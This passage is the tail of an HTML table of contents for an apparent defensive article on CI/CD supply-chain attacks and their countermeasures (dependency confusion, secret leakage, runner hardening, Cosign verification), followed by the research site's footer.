href="#b-dependencyregistry-poisoning-typosquatting-dependency-confusion" class="table-of-contents__link toc-highlight">B. Dependency/registry poisoning (typosquatting, dependency confusion)</a></li><li><a href="#c-secret-leakage-hardcoded-tokens--env-vars" class="table-of-contents__link toc-highlight">C. Secret leakage (hardcoded tokens / env vars)</a></li><li><a href="#d-build-agent-takeover-docker-socket-vulnerable-base-images" class="table-of-contents__link toc-highlight">D. Build agent takeover (docker socket, vulnerable base images)</a></li><li><a href="#e-artifact-repository-compromise-nexus-artifactory-github-packages" class="table-of-contents__link toc-highlight">E. Artifact repository compromise (Nexus, Artifactory, GitHub Packages)</a></li><li><a href="#3-defenses--concrete-tools-configs--examples" class="table-of-contents__link toc-highlight">3) Defenses — concrete tools, configs &amp; examples</a></li><li><a href="#identity--credentials-short-lived-auditable-tokens" class="table-of-contents__link toc-highlight">Identity &amp; credentials: short-lived, auditable tokens</a></li><li><a href="#secrets-management" class="table-of-contents__link toc-highlight">Secrets management</a></li><li><a href="#supply-chain-integrity" class="table-of-contents__link toc-highlight">Supply-chain integrity</a></li><li><a href="#pipeline-hardening--policy" class="table-of-contents__link toc-highlight">Pipeline hardening &amp; policy</a></li><li><a href="#static--dynamic-analysis-tooling" class="table-of-contents__link toc-highlight">Static &amp; dynamic analysis (tooling)</a></li><li><a href="#protect-runners--build-hosts" class="table-of-contents__link toc-highlight">Protect runners / build hosts</a></li><li><a href="#logging-detection--runtime-controls" class="table-of-contents__link toc-highlight">Logging, detection &amp; runtime controls</a></li><li><a href="#4-example-defenses-in-a-flow--an-end-to-end-sequence" class="table-of-contents__link toc-highlight">4) Example defenses in a flow — an end-to-end sequence</a></li><li><a href="#5-detection--incident-response-playbook-outline" class="table-of-contents__link toc-highlight">5) Detection &amp; incident response (playbook outline)</a></li><li><a href="#6-practical-checklist-apply-this-week" class="table-of-contents__link toc-highlight">6) Practical checklist (apply this week)</a></li><li><a href="#7-recommended-tool-stack-fast-reference" class="table-of-contents__link toc-highlight">7) Recommended tool stack (fast reference)</a></li><li><a href="#8-example-enforce-oidc--cosign-verification-in-github-actions" class="table-of-contents__link toc-highlight">8) Example: enforce OIDC + Cosign verification in GitHub Actions</a></li></ul></li><li><a href="#conclusion--stop-thinking-of-cicd-as-less-important" class="table-of-contents__link toc-highlight">Conclusion — stop thinking of CI/CD as “less important”</a></li></ul></div></div></div></div></main></div></div></div><footer class="site-footer" data-site-shell="standalone" data-site-shell-version="2026-07-24.1"><div class="shared-footer-inner"><a class="shared-footer-brand" href="/"><img src="/assets/ap-logo.png" alt="" width="32" height="32" loading="lazy" decoding="async"><span><strong>Andrey Pautov</strong><small>Security research</small></span></a><nav class="shared-footer-links" aria-label="Footer navigation"><a href="/cti.html">Research</a><a href="/guides.html">Library</a><a href="/projects.html">Products &amp; Labs</a><a href="/adversarygraph/">AdversaryGraph</a><a href="/about.html">About</a></nav><nav class="shared-footer-meta" aria-label="Site information"><a href="/privacy.html">Privacy / Data Handling</a><a href="/about.html#contact">Contact</a><a href="https://github.com/anpa1200" target="_blank" rel="noopener noreferrer">GitHub<span class="visually-hidden"> (opens in a new tab)</span><span aria-hidden="true"> ↗</span></a></nav></div><div class="shared-footer-bottom"><span>© <!-- -->2026<!-- --> Andrey Pautov · Original research and tooling</span><a href="#top" data-back-to-top="true">Back to top ↑</a></div></footer></div>
 </body>
 </html>
